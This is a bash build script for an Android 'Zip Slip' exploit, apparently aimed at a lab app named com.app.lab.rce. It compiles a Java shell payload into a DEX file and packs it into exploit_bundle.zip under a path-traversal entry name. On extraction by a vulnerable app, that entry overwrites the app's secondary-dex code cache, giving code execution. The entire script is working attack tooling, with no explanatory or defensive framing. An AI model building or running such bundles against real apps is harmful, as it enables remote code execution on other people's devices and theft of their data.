#!/bin/bash
set -e

echo "[+] Building NowSecure 2017 exploit payload..."

ANDROID_HOME="${ANDROID_HOME:-$HOME/Library/Android/sdk}"


PLATFORM_PATH=$(find "$ANDROID_HOME/platforms" -type d -name "android-*" | head -n 1)
BUILD_TOOLS_PATH=$(ls -1 "$ANDROID_HOME/build-tools" | sort -V | tail -n 1 | xargs -I {} echo "$ANDROID_HOME/build-tools/{}")

ANDROID_JAR="$PLATFORM_PATH/android.jar"
D8="$BUILD_TOOLS_PATH/d8"

if [ ! -f "$ANDROID_JAR" ]; then
    echo "[-] Error: Android SDK platform not found. Looked in $ANDROID_HOME/platforms"
    echo "    Please set ANDROID_HOME correctly or ensure a platform is installed via Android Studio."
    exit 1
fi

if [ ! -f "$D8" ]; then
    echo "[-] Error: d8 tool not found. Looked in $ANDROID_HOME/build-tools"
    echo "    Please ensure Android build-tools are installed via Android Studio."
    exit 1
fi


rm -rf payload/bin exploit_bundle.zip


echo "[+] Compiling Java payload..."
mkdir -p payload/bin
javac -cp "$ANDROID_JAR" -d payload/bin payload/src/pwn/Shell.java


echo "[+] Creating DEX file..."
cd payload/bin
"$D8" --lib "$ANDROID_JAR" --output . pwn/Shell.class


echo "[+] Creating classes2.zip..."
zip -q classes2.zip classes.dex

cd ../..


echo "[+] Creating exploit bundle with path traversal..."
python3 -c "
import zipfile
import os
with zipfile.ZipFile('exploit_bundle.zip', 'w') as zf:
    path_traversal_name = '../../../../data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip'
    zf.write('payload/bin/classes2.zip', path_traversal_name)
"


if [ -f exploit_bundle.zip ]; then
    SIZE=$(stat -f%z exploit_bundle.zip 2>/dev/null || stat -c%s exploit_bundle.zip)
    echo "[+] Exploit bundle created: exploit_bundle.zip (${SIZE} bytes)"
else
    echo "[-] Error: exploit_bundle.zip not created"
    exit 1
fi

echo "[+] Build complete!"